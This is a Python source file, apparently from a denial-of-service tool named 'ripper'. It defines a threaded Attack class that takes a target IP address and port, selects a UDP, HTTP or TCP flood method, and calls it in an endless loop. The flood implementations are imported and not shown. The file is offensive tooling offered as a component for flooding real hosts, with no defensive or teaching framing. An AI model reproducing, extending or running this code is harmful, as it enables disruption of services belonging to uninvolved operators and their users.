from threading import Thread
from typing import Tuple, Any

from ripper.actions.HttpFlood import HttpFlood
from ripper.actions.TcpFlood import TcpFlood
from ripper.actions.UdpFlood import UdpFlood
from ripper.context import Context


class Attack(Thread):
    """This class creates threads with specified attack method."""
    _target: Tuple[str, int]
    """Target IPv4 address and destination port."""
    _method: str
    """Attack method."""
    _ctx: Context
    """Context to collect Statistic."""
    ATTACK: Any

    def __init__(self, target: Tuple[str, int], method: str = 'tcp', context: Context = None):
        """
        :param target: Target IPv4 address and destination port.
        :param method: Attack method.
        """
        Thread.__init__(self, daemon=True)
        self._target = target
        self._method = method
        self._ctx = context

    def run(self):
        self.create_attack(self._method)
        while True:
            self.ATTACK()

    def create_attack(self, method: str):
        """Create attack for specified method."""
        if method == 'udp':
            self.ATTACK = UdpFlood(self._target, self._ctx)
        elif method == 'http':
            self.ATTACK = HttpFlood(self._target, self._ctx)
        else:  # TCP by default
            self.ATTACK = TcpFlood(self._target, self._ctx)
